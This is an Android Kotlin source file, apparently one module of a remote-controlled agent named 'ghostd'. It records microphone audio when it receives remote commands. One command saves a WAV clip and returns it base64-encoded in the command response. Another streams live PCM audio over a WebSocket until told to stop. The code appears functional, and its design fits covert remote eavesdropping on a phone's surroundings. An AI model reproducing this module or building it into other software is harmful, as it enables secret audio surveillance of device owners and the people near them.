package com.tg.ghostd

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.util.Base64
import com.neovisionaries.ws.client.WebSocket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.nio.ByteOrder

/**
 * Microphone verbs.
 *  - mic record <secs> [--rate N] [--mono]: AudioRecord -> WAV file
 *    (default 44.1 kHz stereo), result includes path + base64 of the WAV
 *    (single-shot upload via the command response).
 *  - mic live: 16 kHz mono PCM chunks streamed over WS with JSON headers
 *    ({"encoding":"pcm_s16le","rate":16000,"channels":1}).
 */
object MicCapturer {

    @Volatile private var stopRequested = false

    private const val LIVE_RATE = 16_000
    private const val LIVE_CHANNELS = 1
    private const val RECORD_MAX_SECS = 60

    // ---------------------------------------------------------------- record

    @SuppressLint("MissingPermission")
    fun record(ctx: Context, secs: Int, rate: Int, channels: Int): JSONObject {
        if (ctx.checkSelfPermission(android.Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED
        ) throw Exception("microphone permission not granted")
        val dur = secs.coerceIn(1, RECORD_MAX_SECS)
        MediaBus.begin(MediaBus.SOURCE_MIC, ctx, null)
        try {
            val minBuf = AudioRecord.getMinBufferSize(
                rate,
                if (channels == 1) AudioFormat.CHANNEL_IN_MONO else AudioFormat.CHANNEL_IN_STEREO,
                AudioFormat.ENCODING_PCM_16BIT
            )
            val rec = AudioRecord(
                MediaRecorder.AudioSource.MIC, rate,
                if (channels == 1) AudioFormat.CHANNEL_IN_MONO else AudioFormat.CHANNEL_IN_STEREO,
                AudioFormat.ENCODING_PCM_16BIT,
                maxOf(minBuf * 2, 8192)
            )
            if (rec.state != AudioRecord.STATE_INITIALIZED) {
                rec.release()
                throw Exception("AudioRecord init failed (mic in use?)")
            }
            val pcm = ByteArrayOutputStream()
            try {
                rec.startRecording()
                val buf = ShortArray(1024)
                val deadline = System.currentTimeMillis() + dur * 1000L
                while (System.currentTimeMillis() < deadline) {
                    val n = rec.read(buf, 0, buf.size)
                    if (n > 0) {
                        val bytes = ByteArray(n * 2)
                        ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN).apply {
                            for (i in 0 until n) putShort(buf[i])
                        }
                        pcm.write(bytes)
                    }
                }
            } finally {
                try {
                    rec.stop()
                } catch (_: Exception) {
                }
                rec.release()
            }

            val dir = ctx.getExternalFilesDir(null) ?: ctx.filesDir
            val f = File(dir, "mic_${System.currentTimeMillis()}.wav")
            FileOutputStream(f).use { out ->
                out.write(wavHeader(pcm.size().toLong(), rate, channels))
                pcm.writeTo(out)
            }
            return JSONObject()
                .put("path", f.absolutePath)
                .put("seconds", dur)
                .put("rate", rate)
                .put("channels", channels)
                .put("bytes", f.length())
                .put("wav_b64", Base64.encodeToString(pcm.toByteArray(), Base64.NO_WRAP))
        } finally {
            MediaBus.end(MediaBus.SOURCE_MIC)
        }
    }

    // ------------------------------------------------------------------ live

    /**
     * Start live PCM streaming. Returns immediately; chunks flow as binary
     * WS messages until "mic stop".
     */
    @SuppressLint("MissingPermission")
    fun live(ctx: Context, ws: WebSocket): JSONObject {
        if (ctx.checkSelfPermission(android.Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED
        ) throw Exception("microphone permission not granted")
        MediaBus.begin(MediaBus.SOURCE_MIC, ctx, ws)
        stopRequested = false
        val streamName = "mic-live"
        val t = Thread {
            try {
                runLive(streamName)
            } catch (_: Exception) {
            } finally {
                MediaBus.end(MediaBus.SOURCE_MIC)
            }
        }.apply { name = "ghostd-miclive"; start() }
        return JSONObject()
            .put("stream", streamName)
            .put("started", true)
            .put("rate", LIVE_RATE)
            .put("channels", LIVE_CHANNELS)
            .put("encoding", "pcm_s16le")
    }

    @SuppressLint("MissingPermission")
    private fun runLive(streamName: String) {
        val minBuf = AudioRecord.getMinBufferSize(
            LIVE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT
        )
        val rec = AudioRecord(
            MediaRecorder.AudioSource.MIC, LIVE_RATE,
            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT,
            maxOf(minBuf * 2, 8192)
        )
        if (rec.state != AudioRecord.STATE_INITIALIZED) {
            rec.release()
            MediaBus.streamEnd(streamName, 0, "AudioRecord init failed")
            return
        }
        // 80 ms chunks (2560 bytes at 16 kHz mono s16le)
        val chunk = ShortArray(LIVE_RATE / 1000 * 80 * LIVE_CHANNELS)
        var sent = 0L
        val extra = JSONObject()
            .put("encoding", "pcm_s16le")
            .put("rate", LIVE_RATE)
            .put("channels", LIVE_CHANNELS)
        try {
            rec.startRecording()
            MediaBus.streamStart(streamName, extra)
            while (!stopRequested) {
                val n = rec.read(chunk, 0, chunk.size)
                if (n > 0) {
                    val bytes = ByteArray(n * 2)
                    ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN).apply {
                        for (i in 0 until n) putShort(chunk[i])
                    }
                    if (!MediaBus.sendFrame(streamName, bytes, extra)) break
                    sent++
                }
            }
        } finally {
            try {
                rec.stop()
            } catch (_: Exception) {
            }
            rec.release()
        }
        MediaBus.streamEnd(streamName, sent, if (stopRequested) "stopped" else "socket closed")
    }

    fun stop(): JSONObject {
        stopRequested = true
        return JSONObject().put("stopping", MediaBus.SOURCE_MIC)
    }

    fun requestStopOnly() {
        stopRequested = true
    }

    // ------------------------------------------------------------------ util

    private fun wavHeader(dataLen: Long, rate: Int, channels: Int): ByteArray {
        val bits = 16
        val byteRate = rate * channels * bits / 8
        val blockAlign = channels * bits / 8
        val totalLen = 36 + dataLen
        val h = ByteBuffer.allocate(44).order(ByteOrder.LITTLE_ENDIAN)
        h.put("RIFF".toByteArray())
        h.putInt(totalLen.toInt())
        h.put("WAVE".toByteArray())
        h.put("fmt ".toByteArray())
        h.putInt(16)                       // PCM chunk size
        h.putShort(1)                     // PCM format
        h.putShort(channels.toShort())
        h.putInt(rate)
        h.putInt(byteRate)
        h.putShort(blockAlign.toShort())
        h.putShort(bits.toShort())
        h.put("data".toByteArray())
        h.putInt(dataLen.toInt())
        return h.array()
    }
}
